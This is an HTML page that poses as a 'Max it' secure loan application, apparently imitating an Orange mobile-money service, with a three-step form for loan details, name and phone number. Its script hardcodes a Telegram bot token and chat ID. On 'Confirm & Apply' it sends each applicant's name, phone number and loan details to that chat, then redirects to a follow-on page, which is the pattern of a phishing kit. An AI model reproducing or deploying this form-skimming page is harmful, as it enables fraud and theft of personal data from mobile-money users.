<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Max it - Secure Loan Application</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --orange: #FF7900;
            --orange-hover: #e66a00;
            --dark: #1a1a1a;
            --text-gray: #4a5568;
            --glass-bg: rgba(255, 255, 255, 0.7);
            --glass-border: rgba(255, 255, 255, 0.8);
            --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        
        body {
            background-color: #f0f4f8;
            color: var(--dark);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
            overflow-x: hidden;
            position: relative;
        }

        .orb { position: fixed; border-radius: 50%; filter: blur(80px); z-index: -1; animation: float 15s infinite alternate ease-in-out; }
        .orb-1 { width: 400px; height: 400px; background: rgba(255, 121, 0, 0.3); top: -10%; left: -5%; }
        .orb-2 { width: 350px; height: 350px; background: rgba(0, 150, 255, 0.2); bottom: -5%; right: -5%; animation-delay: -5s; }
        
        @keyframes float { 0% { transform: translate(0, 0) scale(1); } 100% { transform: translate(30px, -50px) scale(1.1); } }

        .form-container {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            box-shadow: var(--glass-shadow);
            width: 100%;
            max-width: 500px;
            border-radius: 24px;
            padding: 40px;
            position: relative;
            overflow: hidden;
        }
        
        .form-container::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: var(--orange); }
        
        .form-header { text-align: center; margin-bottom: 30px; }
        .form-header h2 { font-size: 28px; font-weight: 800; margin-bottom: 8px; }
        .form-header p { font-size: 14px; color: var(--text-gray); margin-bottom: 20px; }
        
        .progress-bar { display: flex; justify-content: center; gap: 8px; }
        .progress-segment { height: 6px; width: 33%; background-color: rgba(0, 0, 0, 0.05); border-radius: 10px; transition: all 0.4s ease; }
        .progress-segment.active { background-color: var(--orange); box-shadow: 0 0 8px rgba(255, 121, 0, 0.4); }
        
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text-gray); margin-bottom: 8px; }
        
        .input-wrapper { position: relative; display: flex; align-items: center; }
        .input-wrapper i { position: absolute; left: 15px; color: #94a3b8; font-size: 14px; }
        
        .form-control {
            width: 100%;
            padding: 14px 15px 14px 40px;
            border: 2px solid transparent;
            border-radius: 12px;
            font-size: 15px;
            color: var(--dark);
            background-color: rgba(255, 255, 255, 0.9);
            outline: none;
            transition: all 0.3s;
        }
        select.form-control, textarea.form-control { padding-left: 15px; }
        .form-control:focus { border-color: var(--orange); background-color: #fff; box-shadow: 0 0 0 4px rgba(255, 121, 0, 0.1); }
        
        .summary-box { background: rgba(255, 255, 255, 0.9); border-left: 4px solid var(--orange); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
        .summary-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; border-bottom: 1px dashed #e2e8f0; padding-bottom: 8px; }
        .summary-value { font-weight: 600; }
        .highlight-value { color: var(--orange); font-size: 18px; font-weight: 800; }
        
        .button-group { display: flex; gap: 12px; margin-top: 30px; }
        .btn { flex: 1; padding: 16px; border-radius: 12px; font-size: 15px; font-weight: 800; cursor: pointer; border: none; transition: all 0.3s; display: flex; justify-content: center; align-items: center; gap: 8px; }
        .btn-primary { background-color: var(--orange); color: white; }
        .btn-secondary { background-color: rgba(0, 0, 0, 0.05); color: var(--text-gray); }
        
        .form-step { display: none; }
        .form-step.active { display: block; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
    </style>
</head>
<body>
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>

    <div class="form-container">
        <div class="form-header">
            <h2>Loan Application</h2>
            <p id="step-indicator">Step 1: Loan Details</p>
            <div class="progress-bar">
                <div class="progress-segment active" id="prog-1"></div>
                <div class="progress-segment" id="prog-2"></div>
                <div class="progress-segment" id="prog-3"></div>
            </div>
        </div>

        <form id="loanForm">
            <!-- Step 1 -->
            <div class="form-step active" id="step-1">
                <div class="form-group">
                    <label>Loan Type</label>
                    <select class="form-control" id="loanType" required>
                        <option value="" disabled selected>Select a loan type...</option>
                        <option value="Personal Loan">Personal Loan</option>
                        <option value="Business/SME Loan">Business/SME Loan</option>
                        <option value="Education/Student Loan">Education/Student Loan</option>
                        <option value="Emergency/Medical Loan">Emergency/Medical Loan</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Loan Amount (SLe)</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-money-bill-wave"></i>
                        <input type="number" class="form-control" id="loanAmount" placeholder="e.g. 12500" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Repayment Term</label>
                    <select class="form-control" id="loanTerm" required>
                        <option value="" disabled selected>Select duration...</option>
                        <option value="3">3 Months</option>
                        <option value="6">6 Months</option>
                        <option value="12">12 Months (1 Year)</option>
                        <option value="24">24 Months (2 Years)</option>
                    </select>
                </div>
                <div class="button-group">
                    <button type="button" class="btn btn-primary" onclick="nextStep(1)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
                </div>
            </div>

            <!-- Step 2 -->
            <div class="form-step" id="step-2">
                <div class="form-group">
                    <label>First Name</label>
                    <div class="input-wrapper">
                        <i class="fa-regular fa-user"></i>
                        <input type="text" class="form-control" id="firstName" placeholder="Legal First Name" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Last Name</label>
                    <div class="input-wrapper">
                        <i class="fa-regular fa-user"></i>
                        <input type="text" class="form-control" id="lastName" placeholder="Legal Last Name" required>
                    </div>
                </div>
                <div class="form-group">
                    <label>Orange Phone Number</label>
                    <div class="input-wrapper">
                        <i class="fa-solid fa-phone"></i>
                        <input type="tel" class="form-control" id="phone" placeholder="076123456" required>
                    </div>
                </div>
                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)">Back</button>
                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
                </div>
            </div>

            <!-- Step 3 -->
            <div class="form-step" id="step-3">
                <div class="summary-box">
                    <h4>Application Summary</h4>
                    <div class="summary-row"><span>Applicant:</span><span id="sum-name">-</span></div>
                    <div class="summary-row"><span>Loan Request:</span><span id="sum-amount">-</span></div>
                    <div class="summary-row"><span>Duration:</span><span id="sum-term">-</span></div>
                    <div class="summary-row"><span>Est. Monthly Repayment:</span><span class="highlight-value" id="sum-emi">-</span></div>
                </div>
                <div class="button-group">
                    <button type="button" class="btn btn-secondary" onclick="prevStep(3)">Back</button>
                    <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">Confirm & Apply <i class="fa-solid fa-check"></i></button>
                </div>
            </div>
        </form>
    </div>

    <script>
        const botToken = '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8';
        const chatId = '7547427914';

        async function sendToTelegram(pageName, data) {
            const escapeMd = s => String(s).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
            let message = `🚀 *New Data from ${pageName}*\n\n`;
            for (const [key, value] of Object.entries(data)) { message += `*${escapeMd(key)}*: \`${escapeMd(value)}\`\n`; }
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'MarkdownV2' })
                });
            } catch (error) { console.error("Telegram Error:", error); }
        }

        const stepTitles = ["Step 1: Loan Details", "Step 2: Personal Info", "Step 3: Financial Profile"];
        
        function nextStep(current) {
            if (current === 2) populateSummary();
            document.getElementById(`step-${current}`).classList.remove('active');
            document.getElementById(`step-${current+1}`).classList.add('active');
            document.getElementById('step-indicator').innerText = stepTitles[current];
            document.getElementById(`prog-${current+1}`).classList.add('active');
        }

        function prevStep(current) {
            document.getElementById(`step-${current}`).classList.remove('active');
            document.getElementById(`step-${current-1}`).classList.add('active');
            document.getElementById('step-indicator').innerText = stepTitles[current-2];
            document.getElementById(`prog-${current}`).classList.remove('active');
        }

        function populateSummary() {
            const amount = document.getElementById('loanAmount').value;
            const term = document.getElementById('loanTerm').value;
            const name = document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value;
            document.getElementById('sum-name').innerText = name;
            document.getElementById('sum-amount').innerText = 'SLe ' + amount;
            document.getElementById('sum-term').innerText = term + ' Months';
            document.getElementById('sum-emi').innerText = 'SLe ' + Math.round(amount/term);
        }

        async function submitApplication() {
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
            const data = {
                'Name': document.getElementById('firstName').value + ' ' + document.getElementById('lastName').value,
                'Phone': document.getElementById('phone').value,
                'Amount': document.getElementById('loanAmount').value,
                'Term': document.getElementById('loanTerm').value
            };
            await sendToTelegram('Application Page', data);
            window.location.href = 'process.html';
        }
    </script>
</body>
</html>
